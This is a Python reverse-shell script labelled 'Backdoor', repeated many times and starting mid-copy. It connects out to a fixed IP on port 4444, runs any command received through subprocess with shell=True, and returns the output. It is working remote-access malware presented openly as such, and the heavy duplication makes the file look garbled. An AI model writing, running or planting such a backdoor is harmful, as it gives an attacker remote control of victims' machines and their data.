            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor :
    # Send two arguments when creating an object
    # first argument : address family
    # second argument : socket type (TCP connect : socket.SOCK_STREAM
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def execute_system_command(self, command) :
        return subprocess.check_output(command, shell=True)
    def reliable_send(self, data):
        #Changed data type from traditional types to JSON types
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self) :
        json_data = ""
        while True :
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    def run(self):
        while True :
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            if command_result == "exit" :
                exit()
            self.reliable_send(command_result)
        connection.close()

my_backdoor = Backdoor("192.168.111.158",4444)
my_backdoor.run()
